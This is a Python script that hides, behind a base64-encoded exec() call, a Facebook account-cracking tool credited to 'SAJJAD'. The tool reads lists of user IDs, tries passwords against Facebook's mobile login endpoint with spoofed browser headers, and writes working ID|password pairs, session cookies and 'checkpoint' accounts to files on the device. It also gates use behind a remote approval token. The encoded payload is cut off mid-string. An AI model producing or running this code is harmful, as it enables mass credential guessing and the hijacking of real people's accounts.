import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zDQojLSotY29kaW5nOnV0Zi04LSotDQojIFVwZGF0ZSBWMS42DQogDQojIyMgSW1wb3J0IE1vZHVsZQ0KaW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgcHJpbnQoJ1xuIE1vZHVsZSByZXF1ZXN0cyAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KIA0KdHJ5Og0KICAgIGltcG9ydCBjb25jdXJyZW50LmZ1dHVyZXMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gTW9kdWxlIGZ1dHVyZXMgIS4uLlxuJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQ0KIA0KdHJ5Og0KICAgIGltcG9ydCBiczQNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gTW9kdWxlIGJzNCAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiANCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQsIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgS0lOR05BU0VFUg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQogDQogDQpjdCA9IGRhdGV0aW1lLm5vdygpDQpuID0gY3QubW9udGgNCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCiANCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQ0KdGEgPSBjdXJyZW50LnllYXINCmJ1ID0gY3VycmVudC5tb250aA0KaGEgPSBjdXJyZW50LmRheQ0Kb3AgPSBidWxhbltuVGVtcF0NCiMjIyBXQVJOQSBSQU5ET00gIyMjDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0KIyAgQ0hJR09aSUVXT1JMRFdJREUuICAjDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT4NCiANCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgUkVTUE9OU0UgRkFDRUJPT0sgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KZGF0YSxkYXRhMj17fSx7fQ0KYW1hbixjcCxzYWxhaD0wLDAsMA0KdWJhaFAscHdCYXJ1PVtdLFtdDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCmxvb3AgPSAwDQp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iDQp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSINCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCINCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBLU0EtTFg5IEJ1aWxkL0hPTk9SS1NBLUxYOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85Ni4wLjQ2NjQuMTA0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzMzNy4wLjAuMzIuMTE4O10ifQ0KYnVsYW5fdHRsID0geyIwMSI6ICJKYW51YXJ5IiwgIjAyIjogIkZlYnJ1YXJ5IiwgIjAzIjogIk1hcmNoIiwgIjA0IjogIkFwcmlsIiwgIjA1IjogIk1heSIsICIwNiI6ICJKdW5lIiwgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9jdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVjZW1iZXIifQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KZG9uZSA9IEZhbHNlDQpkZWYgYW5pbWF0ZSgpOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIGZvciBjIGluIGl0ZXJ0b29scy5jeWNsZShbJ1x4MWJbMTs5Mm18JywgJ1x4MWJbMTs5Mm0vJywgJ1x4MWJbMTs5Mm0tJywgJ1x4MWJbMTs5Mm1cXCddKToNCiAgICAgICAgaWYgZG9uZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidccntOfVt7T31/f39/f39/e059XSBMb2FkaW5nICcgKyBjKQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJ7Tn1be099f39/f39/f3tOfV0gTG9hZGluZyAnICsgYykNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xye059W3tPfX9/f39/f397Tn1dIExvYWRpbmcgJyArIGMpDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidccntOfVt7T31/f39/f39/e059XSBMb2FkaW5nICcgKyBjKQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJ7Tn1be099f39/f39/f3tOfV0gTG9hZGluZyAnICsgYykNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykNCnQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hbmltYXRlKQ0KdC5zdGFydCgpDQp0aW1lLnNsZWVwKDAuNSkNCmRvbmUgPSBUcnVlDQogDQojIGxlbXBhbmtra2tra2trDQpkZWYgamFsYW4oeik6DQogICAgZm9yIGUgaW4geiArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkNCiANCiMgTE8gS09OVE9MDQpkZWYgbG9nbygpOg0KCXByaW50KCIiIg0KIA0KICAgICAgIyMjIyMjIyMgXDAzM1sxOzk3bSMjICAgICAjIyBcMDMzWzE7OTJtIyMjIyMjIyMNCiAgICAgICAgICMjICAgIFwwMzNbMTs5N20jIyAgICAgIyMgXDAzM1sxOzkybSMjDQogICAgICAgICAjIyAgICBcMDMzWzE7OTdtIyMgICAgICMjIFwwMzNbMTs5Mm0jIw0KICAgICAgICAgIyMgICAgXDAzM1sxOzk3bSMjIyMjIyMjIyBcMDMzWzE7OTJtIyMjIyMjDQogICAgICAgICAjIyAgICBcMDMzWzE7OTdtIyMgICAgICMjIFwwMzNbMTs5Mm0jIw0KICAgICAgICAgIyMgICAgXDAzM1sxOzk3bSMjICAgICAjIyBcMDMzWzE7OTJtIyMNCiAgICAgICAgICMjICAgIFwwMzNbMTs5N20jIyAgICAgIyMgXDAzM1sxOzkybSMjIyMjIyMjDQogDQoNCiAgICAgICAg29vb29vb2yAg29vb29sgICAgICAg29sgICAgICDb2yAg29vb29sgINvb29vb2yAgDQogICAgICAgINvbICAgICAg29sgICDb2yAgICAgINvbICAgICAg29sg29sgICDb2yDb2yAgINvbIA0KICAgICAgICDb29vb29vbINvb29vb29sgICAgICDb2yAgICAgINvbINvb29vb29sg29sgICDb2yANCiAgICAgICAgICAgICDb2yDb2yAgINvbINvbICAg29sg29sgICDb2yDb2yAgINvbINvbICAg29sgDQogICAgICAgINvb29vb29sg29sgICDb2yAg29vb29sgICDb29vb2yAg29sgICDb2yDb29vb29sgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiANCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQogICAgICAgICAgIENPREVEIEJZIDogU0FKSkFEDQogICAgICAgICAgIFdIQVRTQVBQIDogKzg4MDE4NDAyMTUxMDYgICAgDQogICAgICAgICAgIEZCIFBBR0UgIDogU0FKSkFEIEhFTFAgWk9ORSANCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICAgICAgICAgICANCiAgICAgICAgICAgICAgXHgxYlsxOzQxbVx4MWJbMTs5N21URVJBIEJBQiBITyBceDFiWzE7MG0iIiIpDQogDQpkZWYgcmVnKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgbG9nbygpDQogICAgcHJpbnQgKCcnKQ0KICAgIHRpbWUuc2xlZXAoMC4wMDEpIA0KICAgIHRyeToNCiAgICAgICAgdG8gPSBvcGVuKCcvc2RjYXJkL0FuZHJvaWQvLmJzN250LnR4dCcsICdyJykucmVhZCgpDQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgIHJlZzIoKQ0KICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TSEFIWkFEQS1BSE1FRC1TQUpKQUQvQkVTVC1GSUxFLUNMT05FL21haW4vQXBwcm92ZWQudHh0JykudGV4dA0KICAgIGlmIHRvIGluIHI6DQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgcHl0aG9uX2phdmEoKQ0KICAgIGVsc2U6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBsb2dvKCkNCiAgICAgICAgcHJpbnQoJycpDQogICAgICAgIHByaW50ICgnXHRBcHByb3ZlZCBOb3QgRGV0ZWN0ZWQnKQ0KICAgICAgICBwcmludCAoJycpDQogICAgICAgIHByaW50ICgnIFwwMzNbMTs5N21Ub2tlbjogJyArIHRvKQ0KICAgICAgICBwcmludCgnIFdoYXRzQXBwIDogKzg4MDE4NDAyMTUxMDYnKQ0KICAgICAgICBpbnB1dCgnXDAzM1sxOzk3bSBQcmVzcyBFbnRlciBUbyBHZXQgQXBwcm92YWwgXDAzM1sxOzkybShGT1IgRlJFRSknKQ0KICAgICAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vbS5tZS9hYmFseGhvZGkucHkiKQ0KICAgICAgICByZWcoKQ0KIA0KZGVmIHJlZzIoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBsb2dvKCkNCiAgICBwcmludCgnJykNCiAgICBwcmludCAoJ1x0QXBwcm92YWwgTm90IERldGVjdGVkJykNCiAgICBwcmludCgnJykNCiAgICBpZCA9IHV1aWQudXVpZDQoKS5oZXhbOjUwXQ0KICAgIHByaW50ICgnIFRva2VuIDogJyArIGlkKQ0KICAgIHByaW50KCcgV2hhdHNBcHAgOiArODgwMTg0MDIxNTEwNicpDQogICAgaW5wdXQoJyBQcmVzcyBFbnRlciBUbyBHZXQgQXBwcm92YWwgXDAzM1sxOzkybShGT1IgRlJFRSkgJykNCiAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzg4MDE4NDAyMTUxMDYiKQ0KICAgIHNhdiA9IG9wZW4oJy9zZGNhcmQvQW5kcm9pZC8uYnM3bnQudHh0JywgJ3cnKQ0KICAgIHNhdi53cml0ZShpZCkNCiAgICBzYXYuY2xvc2UoKQ0KICAgIHJlZygpDQogDQogDQogDQojTUFTVUsgVE9LRU4NCmRlZiBUSEVTQUpKQUQoT0ssY3ApOg0KICAgIGlmIGxlbihPSykgIT0gMCBvciBsZW4oY3ApICE9IDA6DQogICAgICAgIHByaW50KCdcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQ0KICAgICAgICBwcmludCgnIENyYWNrIEhhcyBCZWVuIENvbXBsZXRlZC4nKQ0KICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQogICAgICAgIHByaW50KCcgWyVzKyVzXSBcMDMzWzE7OTJtIFNVQ0NFU1NGVUxMIDogJXMgLS0tIFwwMzNbMTs5N20vc2RjYXJkL1NBSkpBRC1PSy50eHQnJShPLE8sc3RyKGxlbihvaykpKSkNCiAgICAgICAgcHJpbnQoJyBbJXMrJXNdIFwwMzNbMTs5Mm0gQ0hFQ0tQT0lOVFMgOiAlcyAtLS0gXDAzM1sxOzk3bS9zZGNhcmQvU0FKSkFELUNQLnR4dCclKE8sTyxzdHIobGVuKGNwKSkpKQ0KICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQogICAgICAgIGlucHV0KGYiXG5cMDMzWzE7OTdtIFByZXNzIEVudGVyIFRvIFJldHVybiBUbyBNYWluIE1lbnUgIikNCiAgICAgICAgcHl0aG9uX2phdmEoKQ0KIA0KZGVmIHB5dGhvbl9qYXZhKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgbG9nbygpDQogICAgaXBtID0gcmVxdWVzdHMuZ2V0KHVybF9pcCkuanNvbigpIA0KICAgIElQID0gaXBtWyJvcmlnaW4iXQ0KICAgIHByaW50KCIgXDAzM1sxOzk1bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcHJpbnQoIiBcMDMzWzE7OTJtICAgICAgICAgICAgICBTIEEgSiBKIEEgRCBCIEQgNyAxIikNCiAgICBwcmludCgiIFwwMzNbMTs5NW0gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCIgXDAzM1sxOzk3bSBJUCBBRERSRVNTICAgICAgICBbJXNdXG4iJShJUCkpO3RpbWUuc2xlZXAoMC4wMSkNCiAgICBwcmludCgiIFwwMzNbMTs5N20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCIgXDAzM1sxOzk0bSAgICAgICAgICAgICBEb250IFBsYXkgV2l0aCBNZSAhIikNCiAgICBwcmludCgiIFwwMzNbMTs5NG0gICAgICAgICAgICAgQmVjYXVzZSBJIGtub3cgSSBDYW4iKQ0KICAgIHByaW50KCIgXDAzM1sxOzk0bSAgICAgICAgICAgICAgICBQTEFZIEJldHRlciBUaGFuIFlvdSIpDQogICAgcHJpbnQoIiBcMDMzWzE7OTdtIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgiXDAzM1sxOzk3bSBbMV0gRklMRSBDUkFDSyIpDQogICAgcHJpbnQoIlwwMzNbMTs5MW0gWzBdIEVYSVQiKQ0KICAgIHByaW50KCIiKQ0KICAgIHBlcGVrID0gaW5wdXQoJ1wwMzNbMTs5N20gU2VsZWN0IDogJykNCiAgICBpZiBwZXBlayBpblsnMScsJzAxJ106DQogICAgICAgX194eXpfXygpLmphbnUoaWQpDQogICAgICAgICAgICANCiANCmNsYXNzIF9feHl6X186DQogDQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmlkID0gW10NCiANCiAgICBkZWYgamFudShzZWxmLGlkKToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIGxvZ28oKQ0KICAgICAgICBwcmludCgiIFwwMzNbMTs5N20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgICAgICBwcmludCgiICAgICAgICAgICAgICBGSUxFIENSQUNLIE1FTlUiKQ0KICAgICAgICBwcmludCgiIFwwMzNbMTs5N20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgICAgICBwcmludCgnJykNCiAgICAgICAgc2VsZi5jbnQgPSBpbnB1dCgnJXMgIFRZUEUgRklMRSBOQU1FIDolcyAnJShQLEspKQ0KICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgbG9nbygpDQogICAgICAgIGlucHV0KCclcyAgUHJlc3MgRU5URVIgSUYgWU9VIFdBTlQgVE8gQ09VTlRJTlVFIFBST0NFU1MgOiVzICclKFAsSykpDQogICAgICAgIF9fX3dvcmxkd2lkZV9fXyA9ICgneScpDQogICAgICAgIGlmIF9fX3dvcmxkd2lkZV9fXyBpbiAoJ3llcycsJ1llcycsJ1knLCAneScpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgICAgICBsb2dvKCkNCiAgICAgICAgICAgIHByaW50KCIgXDAzM1sxOzk3bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzkxICAgICAgICAgICAgICBTRUxFQ1QgTUVUSE9EIikNCiAgICAgICAgICAgIHByaW50KCIgXDAzM1sxOzkybSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIHByaW50KCcgWzFdIE1ldGhvZCAxIChRdWl0IEJlc3QpJykNCiAgICAgICAgICAgIHByaW50KCcgWzJdIE1ldGhvZCAyIChCZXN0KScpDQogICAgICAgICAgICBjaGkgPSBpbnB1dCgnICBDaG9vc2UgbWV0aG9kOiAnKQ0KICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnIFdST05HIElOUFVUICcpO3NlbGYuamFudShpZCkNCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjaGFjaGFqaSk6DQogICAgICAgIGdsb2JhbCBvayxjcCxsb29wDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcciBbVEhFIFNBSkpBRF0ge2xvb3B9L3tsZW4oc2VsZi5pZCl9IC0tIE9LOi0ge2xlbihvayl9IC0gQ1A6LSB7bGVuKGNwKX0gJyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcHcgaW4gX19jaGlfXzoNCiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGhlYWRlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNoYWNoYWppLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChNZWVHb05va2lhTjkpIEFwcGxlV2ViS2l0LzUzNC4xMyAoS0hUTUwsIGxpa2UgR2Vja28pIE5va2lhQnJvd3Nlci84LjUuMCBNb2JpbGUgU2FmYXJpLzUzNC4xMyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL3tjaGFjaGFqaX0vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsIGhlYWRlcnM9aGVhZGVyKQ0KICAgICAgICAgICAgICAgIGRhcyA9IHsNCiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJ1aWQiOnVzZXIsDQogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwNCiAgICAgICAgICAgICAgICAgICAgInBhc3MiOnB3LA0KICAgICAgICAgICAgICAgICAgICAibmV4dCI6Imh0dHBzOi8vZGV2ZWxvcGVycy5mYWNlYm9vay5jb20vdG9vbHMvZGVidWcvYWNjZXNzdG9rZW4vIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBoZWFkZXIxID0gew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2hhY2hhamksDQogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIm9yaWdpbiI6Imh0dHBzOi8vIitjaGFjaGFqaSwNCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLU45NzFOKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Ny4wLjQ2NzQuMiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6IlhNTEh0dHBSZXF1ZXN0IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsDQogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NoYWNoYWppKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBwbyA9IHNlc3Npb24ucG9zdChmImh0dHBzOi8ve2NoYWNoYWppfS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCIsIGRhdGEgPSBkYXMsIGhlYWRlcnMgPSBoZWFkZXIxLCBhbGxvd19yZWRpcmVjdHMgPSBGYWxzZSkNCiAgICAgICAgICAgICAgICBpZiAnY191c2VyJyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmJ1xye0h9IFtTQUpKQUQtT0tdIHt1c2VyfSB8IHtwd30nKQ0KICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvU0FKSkFELU9LLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSBzZXNzaW9uLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1c2VyfT9maWVsZHM9YmlydGhkYXkmYWNjZXNzX3Rva2VuPXt0b2tlbnp9JykuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5